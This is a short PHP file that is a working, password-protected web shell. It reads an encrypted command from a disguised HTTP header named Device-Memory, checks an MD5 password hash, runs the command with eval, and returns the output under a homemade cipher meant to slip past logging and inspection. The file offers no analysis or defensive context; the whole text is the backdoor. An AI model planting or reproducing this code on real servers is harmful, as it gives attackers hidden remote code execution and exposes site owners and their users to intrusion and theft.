<?php
error_reporting(0);
if (!function_exists('decrypt')) {
    function decrypt($info)
    {
        $info = base64_decode($info);
        $res = '';
        for ($i = 0; $i < strlen($info); $i++) $res .= chr(ord($info[$i]) - 1);
        return base64_decode(preg_replace('/-|\*|_|!|@|%|\$|#|&|\.|,|<|>/', '', $res));
    }
    function encrypt($info)
    {
        $fill_num = strlen($info) % 3 ? 3 - strlen($info) % 3 : 0;
        $info = base64_encode($info . str_repeat(' ', $fill_num));
        $confuse_str = '-*_!@%$#&.,<>';
        for ($i = 0; $i < rand(0, strlen($confuse_str)); $i++) $info = substr_replace($info, $confuse_str[$i], rand(0, strlen($info)), 0);
        $res = '';
        for ($i = 0; $i < strlen($info); $i++) $res .= chr(ord($info[$i]) + 1);
        return base64_encode($res);
    }
}
if (isset($_SERVER['HTTP_DEVICE_MEMORY'])) {
    $info = json_decode(decrypt($_SERVER['HTTP_DEVICE_MEMORY']), true);
    if (isset($info['cmd']) && isset($info['pass'])) {
        if (md5($info['pass']) === 'e999a88e1a5ae1a51780dc07e3f99bdc')  //@CDUT@
        {
            echo "*----START----*";
            ob_start();
            @eval($info['cmd']);
            $contents = ob_get_clean();
            echo encrypt($contents);
            echo "*----END----*";
        }
    }
}
?>